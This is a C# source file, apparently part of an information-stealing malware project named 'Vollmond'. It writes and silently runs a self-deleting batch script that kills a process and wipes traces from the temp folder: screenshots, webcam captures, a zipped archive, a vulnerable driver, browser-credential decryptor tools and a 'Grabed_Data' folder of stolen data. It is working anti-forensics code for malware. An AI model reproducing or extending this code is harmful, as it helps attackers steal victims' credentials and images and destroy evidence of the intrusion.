using System.Diagnostics;

namespace Vollmond
{
    internal class Clear_Traces
    {
        public static void Clear_traces()
        {
            string tempPath = Path.GetTempPath();

            string bat_content =
                $"""
                @echo off

                taskkill /F /IM Killer.exe /T

                del /q /f "{Path.Combine(tempPath, "screenshot.png")}"
                del /q /f "{Program.zipPath}"
                del /q /f "{Path.Combine(tempPath, "Killer.exe")}"
                del /q /f "{Path.Combine(tempPath, "vulndriver.sys")}"
                del /q /f "{Path.Combine(tempPath, "chromelevator_x64.exe")}"
                del /q /f "{Path.Combine(tempPath, "YandexDecryptor.exe")}"
                del /q /f "{Path.Combine(tempPath, "webcam_screenshot.jpg")}"
                rmdir /q  /s "{Path.Combine(tempPath, "Grabed_Data")}"

                (goto) 2>nul & del "%~f0"
                """; // q - quiet f - force s - recursive

            File.WriteAllText(Path.Combine(tempPath, "delete.bat"), bat_content);

            ProcessStartInfo delete_process = new ProcessStartInfo()
            {
                FileName = Path.Combine(tempPath, "delete.bat"),
                CreateNoWindow = true
            };

            Process.Start(delete_process);
        }

        public static bool TracesExists()
        {
            string tempPath = Path.GetTempPath();
            if (File.Exists(Path.Combine(tempPath, "screenshot.png")))
            {
                return true;
            }
            return false;
        }
    }
}
